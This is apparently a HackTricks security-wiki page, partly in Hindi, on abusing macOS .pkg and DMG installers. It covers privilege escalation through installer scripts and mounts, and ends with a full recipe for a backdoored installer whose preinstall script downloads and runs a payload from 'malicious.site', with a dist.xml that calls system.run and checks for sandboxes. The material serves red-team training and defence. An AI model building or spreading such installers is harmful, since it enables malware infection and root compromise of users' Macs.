# macOS Installers Abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Pkg Basic Information

macOS का **इंस्टॉलर पैकेज** (जिसे `.pkg` फ़ाइल के रूप में भी जाना जाता है) एक फ़ाइल प्रारूप है जिसका उपयोग macOS **सॉफ़्टवेयर वितरित करने** के लिए करता है। ये फ़ाइलें एक **डिब्बे की तरह होती हैं जिसमें सॉफ़्टवेयर के सही ढंग से स्थापित और चलाने के लिए आवश्यक सभी चीजें होती हैं**।

पैकेज फ़ाइल स्वयं एक संग्रह है जो **फाइलों और निर्देशिकाओं की एक पदानुक्रम को रखता है जो लक्षित** कंप्यूटर पर स्थापित की जाएंगी। इसमें **स्क्रिप्ट** भी शामिल हो सकती हैं जो स्थापना से पहले और बाद में कार्य करने के लिए होती हैं, जैसे कि कॉन्फ़िगरेशन फ़ाइलों को सेट करना या सॉफ़्टवेयर के पुराने संस्करणों को साफ़ करना।

### Hierarchy

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Distribution (xml)**: कस्टमाइज़ेशन (शीर्षक, स्वागत पाठ…) और स्क्रिप्ट/स्थापना जांच
* **PackageInfo (xml)**: जानकारी, स्थापना आवश्यकताएँ, स्थापना स्थान, चलाने के लिए स्क्रिप्ट के पथ
* **Bill of materials (bom)**: फ़ाइलों की सूची जो स्थापित, अपडेट या हटा दी जाएंगी फ़ाइल अनुमतियों के साथ
* **Payload (CPIO archive gzip compresses)**: PackageInfo से `install-location` में स्थापित करने के लिए फ़ाइलें
* **Scripts (CPIO archive gzip compressed)**: पूर्व और पश्चात स्थापना स्क्रिप्ट और निष्पादन के लिए अस्थायी निर्देशिका में निकाली गई अधिक संसाधन।

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## DMG Basic Information

DMG फ़ाइलें, या Apple Disk Images, एक फ़ाइल प्रारूप हैं जो Apple के macOS द्वारा डिस्क इमेज के लिए उपयोग किया जाता है। एक DMG फ़ाइल मूल रूप से एक **माउंट करने योग्य डिस्क इमेज** है (इसमें अपना खुद का फ़ाइल सिस्टम होता है) जिसमें कच्चा ब्लॉक डेटा होता है जो आमतौर पर संकुचित और कभी-कभी एन्क्रिप्टेड होता है। जब आप एक DMG फ़ाइल खोलते हैं, तो macOS **इसे एक भौतिक डिस्क की तरह माउंट करता है**, जिससे आप इसकी सामग्री तक पहुँच सकते हैं।

{% hint style="danger" %}
Note that **`.dmg`** installers support **so many formats** that in the past some of them containing vulnerabilities were abused to obtain **kernel code execution**.
{% endhint %}

### Hierarchy

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

The hierarchy of a DMG file can be different based on the content. However, for application DMGs, it usually follows this structure:

* Top Level: यह डिस्क इमेज की जड़ है। इसमें अक्सर एप्लिकेशन और संभवतः Applications फ़ोल्डर का एक लिंक होता है।
* Application (.app): यह वास्तविक एप्लिकेशन है। macOS में, एक एप्लिकेशन आमतौर पर एक पैकेज होता है जिसमें कई व्यक्तिगत फ़ाइलें और फ़ोल्डर होते हैं जो एप्लिकेशन बनाते हैं।
* Applications Link: यह macOS में Applications फ़ोल्डर के लिए एक शॉर्टकट है। इसका उद्देश्य आपको एप्लिकेशन स्थापित करने में आसानी प्रदान करना है। आप एप्लिकेशन स्थापित करने के लिए .app फ़ाइल को इस शॉर्टकट पर खींच सकते हैं।

## Privesc via pkg abuse

### Execution from public directories

If a pre or post installation script is for example executing from **`/var/tmp/Installerutil`**, and attacker could control that script so he escalate privileges whenever it's executed. Or another similar example:

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

This is a [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) that several installers and updaters will call to **execute something as root**. This function accepts the **path** of the **file** to **execute** as parameter, however, if an attacker could **modify** this file, he will be able to **abuse** its execution with root to **escalate privileges**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Execution by mounting

यदि एक इंस्टॉलर `/tmp/fixedname/bla/bla` में लिखता है, तो आप **`/tmp/fixedname`** पर कोई मालिक नहीं होने के साथ **एक माउंट** बना सकते हैं ताकि आप **इंस्टॉलेशन के दौरान किसी भी फ़ाइल को संशोधित कर सकें** और इंस्टॉलेशन प्रक्रिया का दुरुपयोग कर सकें।

इसका एक उदाहरण **CVE-2021-26089** है जिसने **एक आवधिक स्क्रिप्ट को ओवरराइट** करने में सफलता प्राप्त की ताकि रूट के रूप में निष्पादन प्राप्त किया जा सके। अधिक जानकारी के लिए इस वार्ता को देखें: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

यह केवल **`.pkg`** फ़ाइल को **पूर्व और पश्चात-स्थापना स्क्रिप्ट** के साथ उत्पन्न करना संभव है, जिसमें स्क्रिप्ट के अंदर केवल मैलवेयर होता है।

### JS in Distribution xml

यह पैकेज के **distribution xml** फ़ाइल में **`<script>`** टैग जोड़ना संभव है और वह कोड निष्पादित होगा और यह **`system.run`** का उपयोग करके **कमांड निष्पादित कर सकता है**:

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Backdoored Installer

दुष्ट इंस्टॉलर जो स्क्रिप्ट और dist.xml के अंदर JS कोड का उपयोग करता है
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## संदर्भ

* [**DEF CON 27 - पैकेजों को अनपैक करना: macOS इंस्टॉलर पैकेजों के अंदर एक नज़र और सामान्य सुरक्षा दोष**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0: "macOS इंस्टॉलर की जंगली दुनिया" - टोनी लैम्बर्ट**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - पैकेजों को अनपैक करना: macOS इंस्टॉलर पैकेजों के अंदर एक नज़र**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जांच करें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमारे** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** का पालन करें।**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
